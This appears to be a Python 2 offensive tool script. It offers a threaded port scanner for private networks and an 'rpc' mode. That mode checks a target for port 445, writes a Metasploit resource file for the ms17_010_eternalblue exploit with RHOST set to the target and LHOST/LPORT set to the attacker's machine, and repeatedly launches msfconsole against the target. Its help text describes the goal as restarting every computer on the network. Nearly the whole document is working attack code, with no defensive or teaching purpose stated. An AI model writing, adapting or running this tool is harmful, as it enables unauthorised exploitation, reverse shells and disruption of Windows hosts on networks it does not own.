#encoding:utf-8
#Maker: 9kSvh
import socket;
import optparse;
from ColorPrint import *;
import sys;
socket.setdefaulttimeout(0.1);
import threading;

OverTh=[];

#Set this function for scanner A B C class network 
def Scanner(Address,Count,Ports,Mins=[],Maxs=[],IsTh=[],Exists={}):
	if(Count != len(Mins) or Count != len(Maxs) or Count != len(IsTh)):
		PrintRed("[-] Parameters error");
		return False;
	#A class network be 10.0.0.0-10.255.255.255
	#B class network be 172.16.0.0-172.31.255.255
	#C class network be 192.168.0.0-192.168.255.255
	for a in range(Mins[0],Maxs[0]+1) :
		IP=Address+'.'+str(a);
		if((Count-1) and IsTh[0] == False ):
			Scanner(IP,Count-1,Ports,Mins[1:],Maxs[1:],IsTh[1:],Exists);
		elif((Count-1) and IsTh[0]):
			thObj = threading.Thread(target=Scanner,args=(IP,Count-1,Ports,Mins[1:],Maxs[1:],IsTh[1:],Exists,));
			thObj.start();
		elif(not (Count-1)):
			for port in Ports:
				try:
					sock = socket.socket();	
					sock.connect((IP,port));
					Arr = Exists[str(port)];
					Arr.append(IP);
					Exists[str(port)]=Arr;
					PrintGreen("[+] Exists port:"+str(port) +" IP->"+IP);
				except Exception as e:
					#print e;
					None;

	OverTh.append(True);
	return True;
	


#Set this a function for Traversal current network ip or port !
def ScannerPort(Parameters):
	print '\033[44;35;40m Start scan current network !';
	PrintGreen("[+] program start scan port!");
	if( len(Parameters) <= 1):
		PrintRed("[-] Need parameters ");
		return False;
	NCList = ['A','B','C'];
	NC = Parameters[0];
	if( NC.upper() in NCList):
		PrintGreen( '[+] Load "'+NC+'" network');
	else:
		PrintRed("[-] Error ! you input class not exists NCList ");
		return False;
	#Get user input ports for scan port 
	Ports=Parameters[1:];
	Exists={};
	Tmp_Port=[];
	for port in Ports :
		Exists[port]=[];
		port = int(port);
		if(port <0 or port > 65500):
			PrintRed("[-] Are you kidding me ? port must be 0-65535");
			return False;
		None;
		Tmp_Port.append(port);
		
	None;
	Ports=Tmp_Port;
	#SelectIndex= NCList.index(NC);
	SelectIndex=2;
	

	Sum = 0;
	if(SelectIndex == 0):
		Scanner('10',3,Ports,[0,0,0],[255,255,255],[True,True,True],Exists);
		Sum = 2+255;
	elif(SelectIndex == 1):
		Scanner('172',3,Ports,[16,0,0],[31,255,255],[True,True,True],Exists);
		Sum=(1+(32-16))+255;
	elif(SelectIndex == 2):
		Scanner('192.168',2,Ports,[0,0],[255,255],[True,True],Exists);
		Sum = 256;
	
	while(True):
		#print len(OverTh);
		if(Sum <= len(OverTh)):
			PrintYellow("[*] Exists:"+str(Exists));
			break;
	return True;

def ExistsPort(IP,Port):
	try:
		sock = socket.socket();
		sock.connect((IP,Port));
		return True;
	except:
		return False;
	None;


#define this a function for traversal current network of ip and  restart comput ,if aim have state is open 445 port !
def RestartComputer(Parameters):
	#Tell cilent he start a restart current network all comput program and all message;
	PrintGreen("[+] you start restart current network all comput program !");
	PrintGreen("[*] this moudlue make by:9sPowh");
	PrintYellow("[!]this moudlue need msfconsole(metasploit framework) or you can use kali or parrotOs ... Linux System!");
	#traversal all ip , can restart compute if ip exists port '445' 
	#Judger aim exists port '445'
	#PrintGreen("[+]S"
	if( len( Parameters ) < 2 ):
		PrintRed("[-] -rpc take ");
		return False;
	IP = Parameters[1];
	SelfIP = Parameters[0];
	try:
		sock = socket.socket();
		sock.connect((IP,445));
		PrintGreen("[+] Exists 445\r\n Start attack");
	except:
		PrintRed("[-] Aim not exists port '445'");
		return False;
	PrintYellow("[+] Set config file ");
	#Use ms_17_010 
	#Need msfconsole(metasploit framework)
	fp = open('config.rc','w');
	configText= """use exploit/windows/smb/ms17_010_eternalblue
set RHOST """+IP+"""
set LHOST """+SelfIP+"""
set LPORT 36963
set VerifyArch false
exploit"""
	fp.write(configText);
	#Need close filestream  for msfconsole call 'config.rc'
	fp.close();
	#return True;
	import pexpect;
	import os;
	PATH = os.getcwd();
	PATH = '"'+PATH+'/config.rc"';
	PrintGreen("[+] Aim file :"+PATH);
	while(True):
		if(not ExistsPort(IP,445)):
			continue;
		PrintGreen("[+] Start attack IP:"+IP+":445 -> ms17_010 ");
		SpawnObj = pexpect.spawn("msfconsole -r "+PATH);
		SpawnObj.expect([pexpect.TIMEOUT]);
	"""	
	import re;
	
	ComLines = re.split('\n|\r',configText);#.split('\r');
	for com in ComLines:
		SpawnObj.expect([pexpect.TIMEOUT]);
		SpawnObj.send(com);
		print SpawnObj.before;"""
	
	
	#PrintGreen( str(SpawnObj.before));
	return True;



import re;

import 	Extend_rpc;

def main():
	#Show a message tell client program start runing!
	PrintGreen("[+]Start program - - -");
	#Use optparse modlue pack parameters (parameters from user input )
	Parser = optparse.OptionParser("Python Script.py -m <Mode> -p <Parameters>");
	#Add parameter variable  name !
	Parser.add_option("-m",'--mode',dest='Mode',type='string',help='a mode  modes: ps/rpc  if you input "ml" Can you read all mode list');
	Parser.add_option("-p",'--parameters',dest='par',type='string',help='need a parameters array!');
	#pack parameters;
	(options,args)=Parser.parse_args();
	#judge mode , print a message if you mode input is a 'ml';
	if( options.Mode == 'ml' ):
		print 'Mode: \r\n\tps: Port scanner! \r\n\trpc use eternalblue port is 445 restart all computer! \r\nftp: ftp tool box;';
	#Set a dictionary for mode !
	import ftpTB;
	opt={'ps':ScannerPort,'rpc':RestartComputer,'ftp':None,'mrpc':Extend_rpc.MSRestart};
	if(options.Mode == None and options.par == None):	
		PrintGreen("[+] you need input parameters ");
		return False;
	#initialization fun variable !
	fun = None;
	for key in opt.keys():#traversal 'opt' dictionary of keys array;
		if(re.match(key,options.Mode) != None):
			fun = opt[key];
			break;
		None;
	None;
	if(fun == None):
		return True;
	#if '-p' parameters not is none,so and 'args' of variable join to tmp_args and set 'args' variable is 'tmp_args' variable
	if(options.par != None):
		#args.append(options.par);
		tmp_args = [];
		tmp_args.append(options.par);
		for item in args:
			tmp_args.append(item);
		args = tmp_args;
	fun(args);
	return True;


if __name__ == '__main__':
	result=main();
	if(result):
		print '\033[44;33;40m Run success!';
	else:
		print '\033[44;31;40m Run faild!';





